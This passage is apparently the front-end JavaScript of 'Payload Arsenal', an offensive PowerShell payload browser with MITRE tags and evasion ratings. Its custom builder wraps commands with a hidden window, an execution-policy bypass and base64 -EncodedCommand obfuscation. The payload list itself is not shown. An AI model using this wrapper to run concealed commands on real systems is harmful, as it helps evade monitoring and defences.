            <p class="card-description">${payload.description}</p>
            ${payload.warning ? `<div class="card-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="detection-tag">Detection: ${payload.detection_difficulty || 'Unknown'}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-plus"></i> Select
                </button>
                <button class="btn-secondary" onclick="app.generateSinglePayload('${key}')">
                    <i class="fas fa-play"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.showPayloadDetails('${key}')">
                    <i class="fas fa-info"></i> Details
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')" title="${isFavorite ? 'Remove from favorites' : 'Add to favorites'}">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        return card;
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    generatePayload(type) {
        this.selectedPayloads = this.selectedPayloads || new Set();
        this.selectedPayloads.add(type);
        this.updateBulkUI();
        this.showNotification(`Added "${this.formatTitle(type)}" to selection`, 'info');
    }

    generateSinglePayload(type) {
        const startTime = performance.now();
        const payload = payloads[type];
        if (!payload) return;

        // Add to history
        this.addToHistory(type, payload);

        // Update performance metrics
        this.performanceMetrics.totalGenerations++;
        this.performanceMetrics.lastGenerated = new Date();

        // Show output panel with animation
        const outputPanel = document.getElementById('outputPanel');
        outputPanel.classList.add('active');

        // Update output content
        document.getElementById('payloadOutput').textContent = payload.command;
        document.getElementById('description').textContent = payload.description;
        
        // Update metadata with enhanced information
        const metadata = document.getElementById('metadata');
        const endTime = performance.now();
        const generationTime = (endTime - startTime).toFixed(2);
        
        this.performanceMetrics.averageTime = 
            (this.performanceMetrics.averageTime * (this.performanceMetrics.totalGenerations - 1) + parseFloat(generationTime)) 
            / this.performanceMetrics.totalGenerations;

        metadata.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category || 'General'}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Detection Difficulty:</strong> ${payload.detection_difficulty || 'Unknown'}
                </div>
                <div class="metadata-item">
                    <strong>Evasion Rating:</strong> ${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}
                </div>
                <div class="metadata-item">
                    <strong>Author:</strong> ${payload.author}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
                <div class="metadata-item">
                    <strong>Generation Time:</strong> ${generationTime}ms
                </div>
                <div class="metadata-item">
                    <strong>Payload Length:</strong> ${payload.command.length} characters
                </div>
                ${payload.warning ? `<div class="metadata-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
            </div>
        `;

        // Apply syntax highlighting
        this.applySyntaxHighlighting();
        
        // Show success notification
        this.showNotification(`Payload "${this.formatTitle(type)}" generated successfully!`, 'success');
        
        // Show browser notification if permission granted
        if ('Notification' in window && Notification.permission === 'granted') {
            new Notification('Payload Arsenal', {
                body: `Generated ${this.formatTitle(type)} payload`,
                icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ctext y=".9em" font-size="90"%3E🛡️%3C/text%3E%3C/svg%3E',
                silent: true
            });
        }
    }

    updateBulkUI() {
        const bulkPanel = document.getElementById('bulkPanel');
        const selectedCount = document.getElementById('selectedCount');
        const selectedList = document.getElementById('selectedList');
        
        if (this.selectedPayloads && this.selectedPayloads.size > 0) {
            bulkPanel.classList.add('active');
            selectedCount.textContent = this.selectedPayloads.size;
            
            selectedList.innerHTML = '';
            this.selectedPayloads.forEach(type => {
                const item = document.createElement('div');
                item.className = 'selected-item';
                item.innerHTML = `
                    <span>${this.formatTitle(type)}</span>
                    <button onclick="app.removeFromSelection('${type}')" class="btn-remove">
                        <i class="fas fa-times"></i>
                    </button>
                `;
                selectedList.appendChild(item);
            });
        } else {
            bulkPanel.classList.remove('active');
        }
    }

    removeFromSelection(type) {
        if (this.selectedPayloads) {
            this.selectedPayloads.delete(type);
            this.updateBulkUI();
            this.showNotification(`Removed "${this.formatTitle(type)}" from selection`, 'info');
        }
    }

    clearSelection() {
        this.selectedPayloads = new Set();
        this.updateBulkUI();
        this.showNotification('Selection cleared', 'info');
    }

    generateBulkPayloads() {
        if (!this.selectedPayloads || this.selectedPayloads.size === 0) {
            this.showNotification('No payloads selected', 'warning');
            return;
        }

        let bulkOutput = '';
        let bulkMetadata = [];
        
        this.selectedPayloads.forEach(type => {
            const payload = payloads[type];
            if (payload) {
                bulkOutput += `# ${this.formatTitle(type)} - ${payload.category}\n`;
                bulkOutput += `# ${payload.description}\n`;
                bulkOutput += `${payload.command}\n\n`;
                
                bulkMetadata.push({
                    name: this.formatTitle(type),
                    complexity: payload.complexity,
                    category: payload.category,
                    mitre: payload.mitre_id
                });
            }
        });

        // Show output panel
        const outputPanel = document.getElementById('outputPanel');
        outputPanel.classList.add('active');

        document.getElementById('payloadOutput').textContent = bulkOutput;
        document.getElementById('description').textContent = `Bulk generated ${this.selectedPayloads.size} payloads`;
        
        const metadata = document.getElementById('metadata');
        metadata.innerHTML = `
            <div class="bulk-metadata">
                <div class="metadata-item">
                    <strong>Total Payloads:</strong> ${this.selectedPayloads.size}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
                <div class="metadata-item">
                    <strong>Total Length:</strong> ${bulkOutput.length} characters
                </div>
                <div class="bulk-list">
                    ${bulkMetadata.map(item => `
                        <div class="bulk-item">
                            <span class="name">${item.name}</span>
                            <span class="complexity-${item.complexity}">${item.complexity}</span>
                            <span class="category">${item.category}</span>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;

        this.applySyntaxHighlighting();
        this.showNotification(`Generated ${this.selectedPayloads.size} payloads successfully!`, 'success');
    }

    showPayloadDetails(type) {
        const payload = payloads[type];
        if (!payload) return;

        const modal = document.getElementById('detailsModal');
        const modalTitle = document.getElementById('modalTitle');
        const modalBody = document.getElementById('modalBody');

        modalTitle.textContent = this.formatTitle(type) + ' - Detailed Information';
        
        modalBody.innerHTML = `
            <div class="payload-details">
                <div class="detail-section">
                    <h4><i class="fas fa-info-circle"></i> Overview</h4>
                    <p>${payload.description}</p>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-code"></i> Command</h4>
                    <div class="code-preview">
                        <pre><code>${payload.command}</code></pre>
                        <button class="copy-btn" onclick="app.copyText('${payload.command.replace(/'/g, '\\\'')}')" title="Copy command">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-chart-line"></i> Technical Details</h4>
                    <div class="detail-grid">
                        <div class="detail-item">
                            <span class="label">Complexity:</span>
                            <span class="value complexity-${payload.complexity}">${payload.complexity}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Platform:</span>
                            <span class="value">${payload.platform}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Category:</span>
                            <span class="value">${payload.category || 'General'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">MITRE ATT&CK:</span>
                            <span class="value">${payload.mitre_id || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Detection Difficulty:</span>
                            <span class="value">${payload.detection_difficulty || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Evasion Rating:</span>
                            <span class="value">${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}</span>
                        </div>
                    </div>
                </div>
                
                ${payload.tags ? `
                <div class="detail-section">
                    <h4><i class="fas fa-tags"></i> Tags</h4>
                    <div class="tags">
                        ${payload.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
                    </div>
                </div>
                ` : ''}
                
                ${payload.warning ? `
                <div class="detail-section warning-section">
                    <h4><i class="fas fa-exclamation-triangle"></i> Warning</h4>
                    <p class="warning-text">${payload.warning}</p>
                </div>
                ` : ''}
                
                <div class="detail-section">
                    <h4><i class="fas fa-book"></i> Usage Guidelines</h4>
                    <ul class="guidelines">
                        <li>Use only in authorized testing environments</li>
                        <li>Follow responsible disclosure practices</li>
                        <li>Ensure proper documentation of testing activities</li>
                        <li>Consider legal and ethical implications</li>
                        <li>Respect privacy and data protection regulations</li>
                    </ul>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-shield-alt"></i> Detection Methods</h4>
                    <ul class="detection-methods">
                        ${this.getDetectionMethods(payload).map(method => `<li>${method}</li>`).join('')}
                    </ul>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-tools"></i> Mitigation Strategies</h4>
                    <ul class="mitigation-strategies">
                        ${this.getMitigationStrategies(payload).map(strategy => `<li>${strategy}</li>`).join('')}
                    </ul>
                </div>
            </div>
        `;

        modal.classList.add('active');
    }

    getDetectionMethods(payload) {
        const detectionMap = {
            'basic': ['Process monitoring', 'Command line logging', 'File system monitoring'],
            'intermediate': ['Behavioral analysis', 'Network monitoring', 'Registry monitoring', 'API call monitoring'],
            'advanced': ['Memory analysis', 'API hooking', 'Advanced behavioral detection', 'Heuristic analysis'],
            'expert': ['Kernel-level monitoring', 'Hardware-based detection', 'Advanced threat hunting', 'Machine learning detection']
        };
        
        return detectionMap[payload.complexity] || ['Standard monitoring'];
    }

    getMitigationStrategies(payload) {
        const mitigationMap = {
            'basic': ['Enable PowerShell logging', 'Implement application whitelisting', 'Regular security awareness training'],
            'intermediate': ['Deploy EDR solutions', 'Network segmentation', 'Principle of least privilege', 'Regular vulnerability assessments'],
            'advanced': ['Advanced threat hunting', 'Behavioral analysis systems', 'Zero-trust architecture', 'Memory protection mechanisms'],
            'expert': ['Hardware-based attestation', 'Hypervisor-based security', 'Advanced sandboxing', 'AI/ML-based detection systems']
        };
        
        return mitigationMap[payload.complexity] || ['Standard security controls'];
    }

    buildCustomPayload() {
        const customCommand = document.getElementById('customCommand').value.trim();
        const encodeBase64 = document.getElementById('encodeBase64').checked;
        const hiddenWindow = document.getElementById('hiddenWindow').checked;
        const bypassPolicy = document.getElementById('bypassPolicy').checked;
        
        if (!customCommand) {
            this.showNotification('Please enter a PowerShell command first.', 'warning');
            return;
        }
        
        let finalPayload = customCommand;
        let description = 'Custom PowerShell command';
        
        // Build the command with options
        let commandArgs = [];
        
        if (hiddenWindow) {
            commandArgs.push('-WindowStyle Hidden');
            description += ' (hidden window)';
        }
        
        if (bypassPolicy) {
            commandArgs.push('-ExecutionPolicy Bypass', '-NoProfile');
            description += ' (bypass execution policy)';
        }
        
        if (encodeBase64) {
            // Convert to Base64
            const bytes = new TextEncoder().encode(customCommand);
            const base64 = btoa(String.fromCharCode(...bytes));
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -EncodedCommand ${base64}`;
            description += ' (Base64 encoded)';
        } else {
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -Command "${customCommand.replace(/"/g, '\\"')}"`;
        }
        
        // Show output
        const outputPanel = document.getElementById('outputPanel');
        outputPanel.classList.add('active');
        
        document.getElementById('payloadOutput').textContent = finalPayload;
        document.getElementById('description').textContent = description;
        document.getElementById('metadata').innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Type:</strong> Custom Payload
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
                <div class="metadata-item">
                    <strong>Author:</strong> User (0x0806 Platform)
                </div>
                <div class="metadata-item">
                    <strong>Options:</strong> ${[
                        hiddenWindow ? 'Hidden Window' : null,
                        bypassPolicy ? 'Bypass Policy' : null,
                        encodeBase64 ? 'Base64 Encoded' : null
                    ].filter(Boolean).join(', ') || 'None'}
                </div>
                <div class="metadata-item">
                    <strong>Payload Length:</strong> ${finalPayload.length} characters
                </div>
                <div class="metadata-item">
                    <strong>Original Length:</strong> ${customCommand.length} characters
                </div>
            </div>
        `;

        this.applySyntaxHighlighting();
        this.showNotification('Custom payload generated successfully!', 'success');
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
        
        // Highlight search results
        if (term) {
            this.highlightSearchResults(term);
        }
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;
        
        cards.forEach(card => {
            const title = card.querySelector('h3').textContent.toLowerCase();
            const description = card.querySelector('.card-description').textContent.toLowerCase();
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());
            const complexity = card.dataset.complexity;
            const platform = card.dataset.platform;
            
            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));
            
            const matchesComplexity = this.activeFilters.complexity.includes(complexity);
            const matchesPlatform = this.activeFilters.platform.includes(platform);
            
            if (matchesSearch && matchesComplexity && matchesPlatform) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        // Update section count
        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    highlightSearchResults(term) {
        if (!term) return;
        
        document.querySelectorAll('.payload-card:not([style*="none"])').forEach(card => {
            const elements = card.querySelectorAll('h3, .card-description');
            elements.forEach(element => {
                const originalText = element.dataset.originalText || element.textContent;
                element.dataset.originalText = originalText;
                
                const regex = new RegExp(`(${term})`, 'gi');
                element.innerHTML = originalText.replace(regex, '<mark>$1</mark>');
            });
        });
    }

    updateFilters() {
        const complexityFilters = Array.from(document.querySelectorAll('.filter-option input[value^="basic"], .filter-option input[value^="intermediate"], .filter-option input[value^="advanced"], .filter-option input[value^="expert"]'))
            .filter(input => input.checked)
            .map(input => input.value);
        
        const platformFilters = Array.from(document.querySelectorAll('.filter-option input[value^="windows"], .filter-option input[value^="linux"], .filter-option input[value^="macos"]'))
            .filter(input => input.checked)
            .map(input => input.value);

        this.activeFilters = {
            complexity: complexityFilters,
            platform: platformFilters
        };
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        
        // Update icon
        const icon = document.querySelector('#themeToggle i');
        icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        
        // Save preference
        localStorage.setItem('theme', this.currentTheme);
        
        this.showNotification(`Switched to ${this.currentTheme} theme`, 'info');
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    toggleMobileMenu() {
        document.getElementById('sidebar').classList.toggle('active');
    }

    toggleFilters(show = null) {
        const panel = document.getElementById('filterPanel');
        if (show === null) {
            panel.classList.toggle('active');
        } else if (show) {
            panel.classList.add('active');
        } else {
            panel.classList.remove('active');
        }
    }

    toggleFavorite(payloadKey) {
        const index = this.favorites.indexOf(payloadKey);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showNotification(`Removed from favorites`, 'info');
        } else {
            this.favorites.push(payloadKey);
            this.showNotification(`Added to favorites`, 'success');
        }
        
        localStorage.setItem('favorites', JSON.stringify(this.favorites));
        
        // Update UI
        this.generateSectionContent(this.currentSection);
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            payload: payload.command,
            timestamp: new Date().toISOString(),
            description: payload.description
        };
        
        this.payloadHistory.unshift(historyItem);
        
        // Keep only last 50 items
        if (this.payloadHistory.length > 50) {
            this.payloadHistory = this.payloadHistory.slice(0, 50);
        }
        
        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    closeOutput() {
        document.getElementById('outputPanel').classList.remove('active');
    }

    closeModal() {
        document.getElementById('detailsModal').classList.remove('active');
    }

    applySyntaxHighlighting() {
        const codeElement = document.querySelector('#payloadOutput');
        if (!codeElement) return;
        
        let code = codeElement.textContent;
        
        // PowerShell syntax highlighting
        const patterns = [
            { pattern: /\b(Get-|Set-|New-|Remove-|Add-|Start-|Stop-|Invoke-|Import-|Export-)[A-Za-z]+/g, class: 'ps-cmdlet' },
            { pattern: /\$[A-Za-z_][A-Za-z0-9_]*/g, class: 'ps-variable' },
            { pattern: /-[A-Za-z]+/g, class: 'ps-parameter' },
            { pattern: /'[^']*'/g, class: 'ps-string' },
            { pattern: /"[^"]*"/g, class: 'ps-string' },
            { pattern: /\b(if|else|elseif|foreach|for|while|do|switch|function|param|begin|process|end)\b/g, class: 'ps-keyword' },
            { pattern: /\b(try|catch|finally|throw)\b/g, class: 'ps-keyword' },
            { pattern: /\b\d+\b/g, class: 'ps-number' },
            { pattern: /#.*$/gm, class: 'ps-comment' }
        ];
        
        patterns.forEach(({pattern, class: className}) => {
            code = code.replace(pattern, `<span class="${className}">$&</span>`);
        });
        
        codeElement.innerHTML = code;
    }

    copyToClipboard() {
        const output = document.getElementById('payloadOutput');
        const text = output.textContent;
        
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Payload copied to clipboard!', 'success');
            }).catch(() => {
                this.fallbackCopyToClipboard(text);
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    copyText(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Command copied to clipboard!', 'success');
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    fallbackCopyToClipboard(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            this.showNotification('Copied to clipboard!', 'success');
        } catch (err) {
            this.showNotification('Failed to copy to clipboard', 'error');
        }
        
        document.body.removeChild(textArea);
    }

    downloadPayload() {
        const output = document.getElementById('payloadOutput');
        const text = output.textContent;
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const blob = new Blob([text], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `payload_arsenal_${timestamp}.ps1`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.showNotification('Payload downloaded successfully!', 'success');
    }

    showTooltip(element, text) {
        const tooltip = document.createElement('div');
        tooltip.className = 'tooltip';
        tooltip.textContent = text;
        document.body.appendChild(tooltip);
        
        const rect = element.getBoundingClientRect();
        tooltip.style.left = rect.left + (rect.width / 2) - (tooltip.offsetWidth / 2) + 'px';
        tooltip.style.top = rect.top - tooltip.offsetHeight - 8 + 'px';
        
        setTimeout(() => tooltip.classList.add('show'), 10);
    }

    hideTooltip() {
        const tooltip = document.querySelector('.tooltip');
        if (tooltip) {
            tooltip.remove();
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => notification.classList.add('show'), 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (notification.parentNode) {
                    document.body.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }
}

// Global functions for backward compatibility
function generatePayload(type) {
    app.generatePayload(type);
}

function buildCustomPayload() {
    app.buildCustomPayload();
}

function copyToClipboard() {
    app.copyToClipboard();
}

function downloadPayload() {
    app.downloadPayload();
}

function showPayloadDetails(type) {
    app.showPayloadDetails(type);
}

function closeOutput() {
    app.closeOutput();
}

function closeModal() {
    app.closeModal();
}

// Initialize application
const app = new PayloadArsenal();

// Handle browser back/forward buttons
window.addEventListener('popstate', (e) => {
    if (e.state && e.state.section) {
        app.loadSection(e.state.section);
    }
});

// Load section from URL hash on page load
window.addEventListener('load', () => {
    const hash = window.location.hash.substring(1);
    if (hash && app.getSectionMap()[hash]) {
        app.loadSection(hash);
    }
});

// Service Worker Registration for PWA capabilities
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js').catch(() => {
            // Service worker registration failed, continue without PWA features
        });
    });
}

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { PayloadArsenal, payloads };
}
